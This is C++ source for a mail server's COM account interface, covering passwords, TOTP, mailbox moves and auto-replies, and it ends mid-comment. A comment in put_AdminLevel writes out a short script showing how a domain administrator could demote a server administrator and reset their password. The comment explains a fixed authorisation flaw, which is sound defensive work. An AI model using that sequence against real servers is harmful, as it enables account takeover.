// https://www.progressiverobot.com
// Copyright (c) 2026 Christopher Holloway / Progressive Robot Ltd
// SPDX-License-Identifier: AGPL-3.0-or-later

#include "stdafx.h"
#include "InterfaceAccount.h"
#include "InterfaceMessages.h"
#include "InterfaceFetchAccounts.h"
#include "InterfaceAppPasswords.h"
#include "InterfaceRules.h"
#include "InterfaceIMAPFolders.h"

#include "../Common/Persistence/MailboxMove.h"
#include "../Common/Util/Unicode.h"
#include "../Common/Persistence/PersistentAccount.h"
#include "../Common/BO/Accounts.h"
#include "../Common/Util/Math.h"
#include "../Common/Util/PasswordPolicy.h"
#include "../Common/Util/PasswordBreachCheck.h"
#include "../Common/Util/PasswordHistory.h"
#include "../Common/Util/Time.h"
#include "../Common/Util/Totp.h"
#include "../Common/Util/PasswordValidator.h"
#include "../Common/Util/SignInStore.h"
#include "../Common/Util/Unicode.h"
#include "../Common/Util/OpenPgpKeyStore.h"
#include "../Common/Util/MessageExport.h"
#include "../Common/Util/Crypt.h"
#include <set>
#include "../Common/Util/FileUtilities.h"
#include "../Common/BO/IMAPFolder.h"
#include "../Common/BO/IMAPFolders.h"
#include "../Common/BO/Messages.h"
#include "../Common/BO/Message.h"
#include "../Common/Persistence/PersistentMessage.h"
#include "../Common/Util/Time.h"
#include "../Common/Cache/AccountSizeCache.h"
#include "../Common/Sieve/SieveStorage.h"

#include "../POP3/POP3Sessions.h"
#include "../IMAP/IMAPFolderUtilities.h"
#include "../IMAP/IMAPFolderContainer.h"

#include "COMAuthentication.h"

#include "../Common/Application/RoleManager.h"
#include "COMError.h"
#include "../Common/Util/PushSubscriptions.h"
#include "../Common/Util/AuditTrail.h"
#include "../Common/Application/Logger.h"

#ifdef _DEBUG
#define DEBUG_NEW new(_NORMAL_BLOCK, __FILE__, __LINE__)
#define new DEBUG_NEW
#endif

using namespace HM;

#ifdef _DEBUG
   long InterfaceAccount::counter = 0;
#endif

STDMETHODIMP InterfaceAccount::InterfaceSupportsErrorInfo(REFIID riid)
{
   static const IID* arr[] = 
   {
      &IID_IInterfaceAccount,
   };

   for (int i=0;i<sizeof(arr)/sizeof(arr[0]);i++)
   {
      if (InlineIsEqualGUID(*arr[i],riid))
         return S_OK;
   }
   return S_FALSE;
}

void
InterfaceAccount::SetAuthentication(std::shared_ptr<HM::COMAuthentication> pAuthentication)
{
   authentication_ = pAuthentication;
}

STDMETHODIMP InterfaceAccount::get_Active(VARIANT_BOOL *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetActive() ? VARIANT_TRUE : VARIANT_FALSE;
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_Active(VARIANT_BOOL newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetActive(newVal == VARIANT_TRUE);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_ADDomain(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetADDomain().AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_ADDomain(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      if (!authentication_->GetIsDomainAdmin())
         return authentication_->GetAccessDenied();
   
      object_->SetADDomain(newVal);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_Address(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetAddress().AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_Address(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      if (!authentication_->GetIsDomainAdmin())
         return authentication_->GetAccessDenied();
   
      HM::String sAddress = newVal;
      sAddress.Trim();
   
      object_->SetAddress(sAddress);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_DomainID(long *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = (long) object_->GetDomainID();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_DomainID(LONG newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      // Only here for backwards compatibility (4.x)
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_IsAD(VARIANT_BOOL *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      if (object_->GetIsAD())
         *pVal = VARIANT_TRUE;
      else
         *pVal = VARIANT_FALSE;
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_IsAD(VARIANT_BOOL newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      if (!authentication_->GetIsDomainAdmin())
         return authentication_->GetAccessDenied();
   
      object_->SetIsAD(newVal == VARIANT_TRUE);
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_Password(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetPassword().AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_TOTPEnabled(VARIANT_BOOL *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      // The secret's presence IS the switch. There is no separate enabled flag,
      // because two sources of truth for "is the second factor on" is how a feature
      // ends up enforced in one place and not another.
      *pVal = object_->GetTotpSecret().IsEmpty() ? VARIANT_FALSE : VARIANT_TRUE;

      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::EnrolTOTP(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      if (!authentication_->GetIsDomainAdmin())
         return authentication_->GetAccessDenied();

      HM::AnsiString secret = HM::Totp::GenerateSecret();

      if (secret.IsEmpty())
         return COMError::GenerateError("The random number generator failed, so no second factor was enrolled. Nothing has been stored. See the hMailServer error log.");

      object_->SetTotpSecret(secret);

      // The URI carries the secret, and this is the only moment it leaves the server:
      // there is no property that reads it back, because the point of a second factor
      // is that possessing the account does not yield it. Whoever enrols has to
      // capture it now - which is exactly what scanning the QR code does.
      *pVal = HM::String(HM::Totp::BuildOtpAuthUri(HM::AnsiString(object_->GetAddress()), secret)).AllocSysString();

      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::DisableTOTP()
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      if (!authentication_->GetIsDomainAdmin())
         return authentication_->GetAccessDenied();

      // App passwords are deliberately left alone. They are separately revocable
      // credentials that were valid before the second factor was enrolled and remain
      // valid after it is removed; silently deleting them here would break every
      // client the account holder had set up, as a side effect of an unrelated
      // administrative action.
      object_->SetTotpSecret("");

      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::ExportMessages(BSTR Directory, long *ExportedCount)
{
   try
   {
      if (!ExportedCount)
         return COMError::GenerateGenericMessage();

      *ExportedCount = 0;

      if (!object_)
         return GetAccessDenied();

      // Server admin, not domain admin: this writes to the server's own file
      // system, and where a file may be written is a machine-level trust.
      if (!authentication_->GetIsServerAdmin())
         return authentication_->GetAccessDenied();

      HM::String directory = Directory;
      directory.Trim();

      if (directory.IsEmpty())
         return COMError::GenerateError("A target directory must be given.");

      int exported = 0;
      HM::String error;

      if (!HM::MessageExport::ExportAccount(object_, directory, exported, error))
         return COMError::GenerateError(error);

      *ExportedCount = exported;

      HM::String logMessage;
      logMessage.Format(_T("Exported %d message(s) for an account on an operator's request."), exported);
      LOG_APPLICATION(logMessage);

      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_Password(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      // The one place an account password is CHOSEN, so the one place the policy is
      // enforced. Every route here goes through this property - the Control Panel,
      // DBSetup, scripts and the API - and none of the paths that merely verify or
      // re-hash an existing password come near it, which is deliberate: refusing a
      // password that already works would lock people out of mailboxes they can open
      // today, in the name of making them safer.
      //
      // Off by default, so an existing installation sees no change until an
      // administrator configures one.
      HM::String policyFailure;

      if (!HM::PasswordPolicy::IsAcceptable(object_->GetAddress(), newVal, policyFailure))
         return COMError::GenerateError(policyFailure);

      // Reuse is checked against the CURRENT password and the last N, and refuses
      // the change rather than anything else - nobody is ever locked out by this,
      // they are standing there able to pick something different.
      if (HM::PasswordHistory::IsReuse(object_, newVal))
         return COMError::GenerateError("This password has been used recently on this account. Choose one that has not.");

      // The published breach corpus, after the local rules so that a password they
      // refuse costs no request, and before the history is recorded so that a
      // refused change leaves no row behind. Off by default.
      HM::String breachRefusal;
      HM::AnsiString breachReason;
      int breachStatus = 0;

      if (!HM::PasswordBreachCheck::IsAcceptable(object_->GetAddress(), newVal, breachRefusal, breachReason, breachStatus))
         return COMError::GenerateError(breachRefusal);

      // Recorded BEFORE the new hash replaces the old one, because the thing being
      // recorded IS the old one.
      HM::PasswordHistory::Record(object_);

      // The password isn't encrypted. Encrypt it now using MD5.
      int preferredHashAlgorithm = HM::IniFileSettings::Instance()->GetPreferredHashAlgorithm();
      String sPassword = HM::Crypt::Instance()->EnCrypt(newVal, (HM::Crypt::EncryptionType) preferredHashAlgorithm);
   
      object_->SetPassword(sPassword);
      object_->SetPasswordEncryption(preferredHashAlgorithm);

      // The age clock starts here, at the one place a password is chosen. Not on
      // the paths that re-hash an existing password to a stronger scheme: an upgrade
      // of the STORAGE is not a change of the SECRET, and treating it as one would
      // quietly reset everybody's expiry the first time they logged in.
      object_->SetPasswordChanged(HM::Time::GetCurrentDateTime());
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_Size(float *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      float fMB = (1024*1024);
   
      __int64 accountSizeBytes = AccountSizeCache::Instance()->GetSize(object_->GetID());
   
      *pVal = HM::Math::Round((float) accountSizeBytes / fMB,3);
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::Save()
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      // Only server administrators have access to change settings for server administrators.
      // Without this check, a domain administrator could change the settings for a server administrator, such
      // as his password and the log on as server administrator.
      // (This would only be possible if the server admin is added as a user to a domain which the domain admin
      // is domain administrator for).
      if (!authentication_->GetIsServerAdmin())
      {
         if (object_->GetAdminLevel() == HM::Account::ServerAdmin)
         {
            return COMError::GenerateError("You do not have access to save the user account. Server administrator accounts can only be updated by server administrators.");
         }
      }

      // The rule above, for every role: an account whose STORED authority this
      // credential does not take in is not this credential's to save, because
      // saving it can set its password. The stored account and not object_,
      // for the reason put_AdminLevel gives - the in-memory level is whatever
      // the caller has just assigned. An unauthenticated holder of an account
      // object is left exactly as it was: that is the script host, whose
      // OnClientValidatePassword hands a script the account being logged on and
      // has always let it save it.
      if (authentication_->GetIsAuthenticated() && object_->GetID() > 0)
      {
         std::shared_ptr<HM::Account> stored = std::shared_ptr<HM::Account>(new HM::Account());

         if (HM::PersistentAccount::ReadObject(stored, object_->GetID()) &&
             !HM::RoleManager::Encompasses(authentication_->GetGrant(), HM::RoleManager::GrantForAccount(stored)))
         {
            return COMError::GenerateError("You do not have access to save the user account. It holds administrative authority that this credential does not.");
         }
      }


      String sErrorMessage;
      if (PersistentAccount::SaveObject(object_, sErrorMessage, true, HM::PersistenceModeNormal))
      {
         // Add to parent collection
         AddToParentCollection();
   
         return S_OK;
      }
   
      return COMError::GenerateError("Failed to save object. " +  sErrorMessage);
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::UnlockMailbox()
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      // The account's own lock is its own to clear - a POP3 session it dropped
      // is not an administrative matter - and anybody else's needs what an
      // unlock needs, in the account's domain, exactly as Application.UnlockAccount
      // and POST /api/v1/accounts/{address}/unlock ask it. Until 15 September
      // 2026 this asked nothing at all.
      const bool own = authentication_->GetAccountID() == object_->GetID();

      if (!own && !authentication_->AllowsForDomain(HM::RolePermission::UnlockAccount, HM::StringParser::ExtractDomain(object_->GetAddress())))
         return authentication_->GetAccessDenied();

      POP3Sessions::Instance()->Unlock(object_->GetID());

      // The lock is held in memory, so neither audit chokepoint sees this; it is
      // recorded here, under the actor the question above installed. The
      // account's own unlock asked no question and so installed none, and a
      // COM pool thread keeps the last caller's actor - so it is not recorded
      // at all, rather than recorded under whoever used the thread last. It is
      // not an administrative change, which is the same answer.
      if (!own)
      {
         HM::AuditTrail::Instance()->RecordEvent(_T("account"), object_->GetAddress(), _T("unlocked"),
            _T("the POP3 mailbox lock was cleared"));
      }
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

namespace
{
   // The JSON MailboxMove builds is UTF-8; a BSTR is wide. InterfaceUtilities
   // has the same two lines beside its own JSON-returning members.
   HM::String WideFromUtf8(const HM::AnsiString &utf8)
   {
      HM::String wide;
      HM::Unicode::MultiByteToWide(utf8, wide);
      return wide;
   }
}

// Renaming a mailbox, and moving one to another domain on this server, are one
// operation, and it is done when MoveTo returns: there is no Save() for it,
// because half of what it does is on disk and in rows the account object does
// not carry. MailboxMove refuses everything that cannot be done safely before
// changing anything, and records the move as one entry on the audit trail.
STDMETHODIMP InterfaceAccount::MoveTo(BSTR NewAddress, VARIANT_BOOL KeepOldAddressAsAlias, BSTR *Summary)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      if (!Summary)
         return COMError::GenerateGenericMessage();

      *Summary = 0;

      if (object_->GetID() <= 0)
         return COMError::GenerateError("The account must be saved before it can be moved.");

      const HM::String newAddress = HM::String(NewAddress).Trim();

      // The account as the DATABASE has it, read before anything is decided.
      // The address on the object in hand is whatever the caller last assigned
      // to it, saved or not, and both questions below are about the account
      // that exists: which domain it is in now, and what authority it holds.
      std::shared_ptr<HM::Account> stored = std::shared_ptr<HM::Account>(new HM::Account());

      if (!HM::PersistentAccount::ReadObject(stored, object_->GetID()) || stored->GetID() <= 0)
         return COMError::GenerateError("The account could not be read. It may have been deleted.");

      // The authority to administer accounts, asked of BOTH domains: the one the
      // mailbox is leaving and the one it is going to. Without the second, a
      // credential confined to one domain could move a mailbox out of it into a
      // domain it has no authority over - which is the whole of somebody else's
      // mail arriving in a place they administer. The first is asked of the
      // STORED address, so that assigning Account.Address before calling this
      // cannot name a domain the credential does have authority over and move a
      // mailbox out of one it does not.
      if (!authentication_->AllowsForDomain(HM::RolePermission::ManageAccounts,
                                            HM::StringParser::ExtractDomain(stored->GetAddress())))
      {
         return authentication_->GetAccessDenied();
      }

      if (!authentication_->AllowsForDomain(HM::RolePermission::ManageAccounts,
                                            HM::StringParser::ExtractDomain(newAddress)))
      {
         return authentication_->GetAccessDenied();
      }

      // The same question Save asks: a credential may not take over an account
      // whose administrative authority it does not itself hold, and moving one is
      // taking it over.
      if (!HM::RoleManager::Encompasses(authentication_->GetGrant(), HM::RoleManager::GrantForAccount(stored)))
         return COMError::GenerateError("You do not have access to move this account. It holds administrative authority that this credential does not.");

      HM::MailboxMoveOutcome outcome;
      HM::String errorMessage;

      if (!HM::MailboxMove::Move(object_, newAddress, KeepOldAddressAsAlias == VARIANT_TRUE, outcome, errorMessage))
         return COMError::GenerateError(errorMessage);

      *Summary = WideFromUtf8(HM::MailboxMove::OutcomeJson(outcome)).AllocSysString();

      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_InUseReason(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      if (!pVal)
         return COMError::GenerateGenericMessage();

      // Readable by anyone who may read the account. It says whether a move
      // would be refused and why, which is what a page needs to disable a
      // button, and it names nothing the caller could not already see.
      *pVal = HM::MailboxMove::InUseReason(object_).AllocSysString();

      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_LastMove(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      if (!pVal)
         return COMError::GenerateGenericMessage();

      HM::MailboxMoveRecord record;

      if (object_->GetID() <= 0 || !HM::MailboxMove::Newest(object_->GetID(), record))
      {
         *pVal = HM::String().AllocSysString();
         return S_OK;
      }

      *pVal = WideFromUtf8(HM::MailboxMove::RecordJson(record)).AllocSysString();

      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::ValidatePassword(BSTR Password, VARIANT_BOOL *pCorrect)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pCorrect = HM::PasswordValidator::ValidatePassword(object_, Password) ? VARIANT_TRUE : VARIANT_FALSE; 
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_ADUsername(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetADUsername().AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_ADUsername(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      if (!authentication_->GetIsDomainAdmin())
         return authentication_->GetAccessDenied();
   
      object_->SetADUsername(newVal);
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::DeleteMessages()
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      PersistentAccount::DeleteMessages(object_);
   
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_Messages(IInterfaceMessages **pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      CComObject<InterfaceMessages>* pMessages = new CComObject<InterfaceMessages>();
      pMessages->SetAuthentication(authentication_);
   
      std::shared_ptr<HM::Messages> pMsgs = object_->GetMessages();
   
      if (!pMsgs)
         return COMError::WithoutMessage(DISP_E_BADINDEX);  
   
      pMessages->Attach(pMsgs);
      pMessages->AddRef();
      *pVal = pMessages;
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_MessageRetentionDays(long *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetMessageRetentionDays();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_MessageRetentionDays(long pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      // Same authority as the account's size limit: the domain administrator's.
      if (!authentication_->GetIsDomainAdmin())
         return authentication_->GetAccessDenied();

      if (pVal < -1)
         return COMError::GenerateError("MessageRetentionDays must be -1 (keep forever), 0 (the domain's policy) or a number of days.");

      object_->SetMessageRetentionDays(pVal);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_MaxSize(long *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetAccountMaxSize();
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_MaxSize(long pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      if (!authentication_->GetIsDomainAdmin())
         return authentication_->GetAccessDenied();
   
      object_->SetAccountMaxSize(pVal);
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_VacationMessageIsOn(VARIANT_BOOL *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = PersistentAccount::GetIsVacationMessageOn(object_) ? VARIANT_TRUE : VARIANT_FALSE;
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_VacationMessageIsOn(VARIANT_BOOL newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetVacationMessageIsOn(newVal == VARIANT_TRUE);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_VacationMessage(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

   
      *pVal = object_->GetVacationMessage().AllocSysString();
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_VacationMessage(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetVacationMessage(newVal);
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_VacationSubject(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

   
      *pVal = object_->GetVacationSubject().AllocSysString();
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_VacationSubject(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetVacationSubject(newVal);
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_VacationMessageExpires(VARIANT_BOOL *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetVacationExpires() ? VARIANT_TRUE : VARIANT_FALSE;
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_VacationMessageExpires(VARIANT_BOOL newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetVacationExpires(newVal == VARIANT_TRUE);
      return S_OK;   
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_VacationMessageExpiresDate(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetVacationExpiresDate().AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_VacationMessageExpiresDate(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      HM::String string = newVal;
      
      // Validate input date.
      if (string.Left(4) == _T("0000"))
         string = "";
   
      if (string.GetLength() == 0)
         string = Time::GetCurrentDate();
      else if (string.GetLength() != 10 || !Time::IsValidSystemDate(string))
         return COMError::GenerateError("Invalid auto-reply expiry date");
   
      object_->SetVacationExpiresDate(string);

      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_VacationMessageBeginDate(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetVacationBeginDate().AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_VacationMessageBeginDate(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      HM::String string = newVal;

      // The same validation the expiry date gets: an empty or zeroed value means
      // "from today", which is the no-scheduling behaviour every account had
      // before this property existed.
      if (string.Left(4) == _T("0000"))
         string = "";

      if (string.GetLength() == 0)
         string = Time::GetCurrentDate();
      else if (string.GetLength() != 10 || !Time::IsValidSystemDate(string))
         return COMError::GenerateError("Invalid auto-reply begin date");

      object_->SetVacationBeginDate(string);

      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_VacationMessageAbortSpamFlagged(VARIANT_BOOL *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetVacationAbortSpamFlagged() ? VARIANT_TRUE : VARIANT_FALSE;
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_VacationMessageAbortSpamFlagged(VARIANT_BOOL newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetVacationAbortSpamFlagged(newVal == VARIANT_TRUE);
      return S_OK;   
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_VacationMessageDays(long *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetVacationDays();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_VacationMessageDays(long newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      if (newVal < 0 || newVal > 3650)
         return COMError::GenerateError("VacationMessageDays must be between 0 and 3650.");

      object_->SetVacationDays((int) newVal);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_VacationInternalSubject(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetVacationInternalSubject().AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_VacationInternalSubject(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetVacationInternalSubject(newVal);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_VacationInternalMessage(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetVacationInternalMessage().AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_VacationInternalMessage(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetVacationInternalMessage(newVal);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_VacationMessageInternalOnly(VARIANT_BOOL *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetVacationInternalOnly() ? VARIANT_TRUE : VARIANT_FALSE;
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_VacationMessageInternalOnly(VARIANT_BOOL newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetVacationInternalOnly(newVal == VARIANT_TRUE);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_AppPasswords(IInterfaceAppPasswords **pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      CComObject<InterfaceAppPasswords>* pItem = new CComObject<InterfaceAppPasswords>();
      pItem->SetAuthentication(authentication_);

      std::shared_ptr<HM::AppPasswords> passwords = std::shared_ptr<HM::AppPasswords>(new HM::AppPasswords());

      passwords->Refresh(object_->GetID());

      pItem->Attach(passwords, object_->GetID());
      pItem->AddRef();
      *pVal = pItem;

      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_FetchAccounts(IInterfaceFetchAccounts **pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      CComObject<InterfaceFetchAccounts>* pItem = new CComObject<InterfaceFetchAccounts >();
      pItem->SetAuthentication(authentication_);
   
      std::shared_ptr<HM::FetchAccounts> pFetchAccounts = std::shared_ptr<HM::FetchAccounts>(new HM::FetchAccounts(object_->GetID()));
   
      pFetchAccounts->Refresh();
   
      if (pFetchAccounts)
      {
         pItem->Attach(pFetchAccounts);
         pItem->AddRef();
         *pVal = pItem;
      }
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_AdminLevel(eAdminLevel *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = (eAdminLevel) object_->GetAdminLevel();
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_AdminLevel(eAdminLevel newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      // Above the switch, deliberately: this asks about the account being MODIFIED, not
      // about the level being assigned, so it must hold on every path through this
      // function.
      //
      // Save() carries a check for the same thing - "Only server administrators have
      // access to change settings for server administrators" - and its comment describes
      // the attack it was meant to stop: a server admin whose mailbox sits in a domain
      // somebody else administers. But it asks object_->GetAdminLevel(), the IN-MEMORY
      // value this setter has already overwritten, and nothing re-reads the stored one.
      // So the guard was defeated by the property assignment that precedes it:
      //
      //    acct = domain.Accounts.ItemByAddress("boss@corp.com")  // a server admin
      //    acct.AdminLevel = 0        // object_ becomes Normal
      //    acct.Password = "..."
      //    acct.Save()                // guard reads Normal, allows both writes
      //
      // A domain administrator could demote the server administrator and set their
      // password in three lines. Refusing the change here is what makes Save()'s check
